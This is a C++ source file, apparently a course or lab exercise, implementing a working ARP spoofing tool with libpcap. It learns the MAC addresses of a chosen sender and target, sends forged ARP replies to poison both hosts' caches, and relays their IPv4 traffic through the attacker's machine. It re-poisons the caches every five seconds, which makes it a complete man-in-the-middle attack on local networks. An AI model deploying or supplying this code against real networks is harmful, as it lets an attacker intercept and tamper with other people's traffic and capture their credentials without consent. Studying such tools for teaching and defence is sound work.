#include "pch.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

#pragma pack(pop)

void usage() {
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

Mac getMacAddress(const char* iface) {
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);

    ioctl(fd, SIOCGIFHWADDR, &ifr);

    close(fd);

    return Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
}

Ip getIpAddress(const char* iface) {
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);

    ioctl(fd, SIOCGIFADDR, &ifr);

    close(fd);

    return Ip(ntohl(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr));
}

void sendArp(pcap_t* pcap, Mac eth_smac, Mac eth_dmac, Ip sip, Ip dip, Mac arp_smac, Mac arp_dmac, uint16_t op){
    EthArpPacket packet;

    packet.eth_.dmac_ = eth_dmac;
    packet.eth_.smac_ = eth_smac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(op);
    packet.arp_.smac_ = arp_smac;
    packet.arp_.sip_ = htonl(sip);
    packet.arp_.tmac_ = arp_dmac;
    packet.arp_.tip_ = htonl(dip);

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    }
}

void replayPacket(pcap_t* pcap, const struct pcap_pkthdr* header, const u_char* packet, Mac my_mac, std::vector<Mac> smacVec, std::vector<Mac> tmacVec){
    EthHdr* ethHdr = (EthHdr*)packet;
    Mac smac = ethHdr->smac();
    Mac tmac = ethHdr->dmac();

    for(int i=0;i<smacVec.size();i++){
        if(smac == smacVec[i] && tmac == my_mac){
            ethHdr->smac_ = my_mac;
            ethHdr->dmac_ = tmacVec[i];
            int res = pcap_sendpacket(pcap, packet, header->caplen);
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
            }
        }
        else if(smac == tmacVec[i] && tmac == my_mac){
            ethHdr->smac_ = my_mac;
            ethHdr->dmac_ = smacVec[i];
            int res = pcap_sendpacket(pcap, packet, header->caplen);
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
            }
        }
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc%2!=0) {
		usage();
		return EXIT_FAILURE;
	}

	char errbuf[PCAP_ERRBUF_SIZE];

    // get my MAC, IP address
    char* dev = argv[1];

    Mac my_mac = getMacAddress(dev);
    Ip my_ip = getIpAddress(dev);

    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return EXIT_FAILURE;
    }

    std::vector<std::pair<Ip, Ip>> ipVec;

    for(int i=2;i<argc;i+=2){
        Ip sip = Ip(argv[i]);
        Ip tip = Ip(argv[i+1]);

        sendArp(pcap, my_mac, Mac::broadcastMac(), my_ip, sip, my_mac, Mac::nullMac(), ArpHdr::Request);
        sendArp(pcap, my_mac, Mac::broadcastMac(), my_ip, tip, my_mac, Mac::nullMac(), ArpHdr::Request);
        ipVec.push_back(std::pair(sip, tip));
    }

    std::vector<Mac> smacVec(ipVec.size());
    std::vector<Mac> tmacVec(ipVec.size());

    time_t lastSpoofTime = 0;

    while(true){
        struct pcap_pkthdr* header;
        const u_char* reply_packet;
        int res = pcap_next_ex(pcap, &header, &reply_packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK){
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }

        EthHdr* ethHdr = (struct EthHdr*)reply_packet;

        // Arp Attack
        if(ethHdr->type() == EthHdr::Arp){
            ArpHdr* arpHdr = (struct ArpHdr*)(reply_packet + sizeof(struct EthHdr));
            for(int i=0;i<ipVec.size();i++){
                if(arpHdr->sip() == ipVec[i].first){
                    // get victim's MAC address
                    if(arpHdr->tip() == my_ip){
                        smacVec[i] = arpHdr->smac();
                        // send initial arp attack to victim
                        sendArp(pcap, my_mac, smacVec[i], ipVec[i].second, ipVec[i].first, my_mac, smacVec[i],ArpHdr::Reply);
                        std::cout << "Sender MAC: " << std::string(smacVec[i]) << std::endl;
                    }
                }
                else if(arpHdr->sip() == ipVec[i].second){
                    // get gateway's MAC address
                    if(arpHdr->tip() == my_ip){
                        tmacVec[i] = arpHdr->smac();
                         //send arp attack to target
                        sendArp(pcap, my_mac, tmacVec[i], ipVec[i].first, ipVec[i].second , my_mac, tmacVec[i],ArpHdr::Reply);
                        std::cout << "Target MAC: " << std::string(tmacVec[i]) << std::endl;
                    }
                }
            }
        }

        // replay
        else if(ethHdr->type() == EthHdr::Ip4){
            replayPacket(pcap, header, reply_packet, my_mac, smacVec, tmacVec);
        }

        //re-attack every 5 seconds
        if (time(nullptr) - lastSpoofTime > 5) {
            for (int i = 0; i < ipVec.size(); i++) {
                if (smacVec[i] != Mac() && tmacVec[i] != Mac()) {
                    sendArp(pcap, my_mac, smacVec[i], ipVec[i].second, ipVec[i].first, my_mac, smacVec[i], ArpHdr::Reply);
                    sendArp(pcap, my_mac, tmacVec[i], ipVec[i].first, ipVec[i].second, my_mac, tmacVec[i], ArpHdr::Reply);
                }
            }
            lastSpoofTime = time(nullptr);
        }
    }

    pcap_close(pcap);

    return 0;
}
